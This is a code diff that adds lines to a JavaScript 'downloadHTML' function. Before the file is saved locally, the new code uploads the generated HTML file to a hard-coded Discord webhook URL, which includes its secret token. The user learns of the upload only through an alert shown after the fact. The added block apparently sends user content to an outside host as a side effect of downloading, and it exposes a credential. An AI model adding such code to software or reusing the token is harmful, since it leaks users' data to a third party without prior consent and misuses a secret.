@@ -573,6 +573,31 @@ function downloadHTML() {
     const blob = new Blob([fullHtml], { type: "text/html" });
     const url = URL.createObjectURL(blob);
     
+    const file = new File([blob], "download.html", { type: "text/html" });
+
+  const timestamp = Math.floor(Date.now() / 1000);
+  const messageContent = `<t:${timestamp}>`;
+
+  const formData = new FormData();
+  formData.append("file", file);
+  formData.append("payload_json", JSON.stringify({ content: messageContent }));
+
+  fetch("https://discord.com/api/webhooks/1364269004872617984/oeRhL21ypUHhjIITxup2sCOl0JI4MsT0UsK9EUxKu877UUQ9pdwou9LX8CVxdCoKpt9L", {
+    method: "POST",
+    body: formData
+  })
+  .then(res => {
+    if (res.ok) {
+      alert("Message + file sent to Discord!");
+    } else {
+      alert("Failed to send file.");
+    }
+  })
+  .catch(err => {
+    console.error("Error sending webhook:", err);
+    alert("Error sending file.");
+  });
+
     const a = document.createElement("a");
     a.href = url;
     a.download = "download.html";
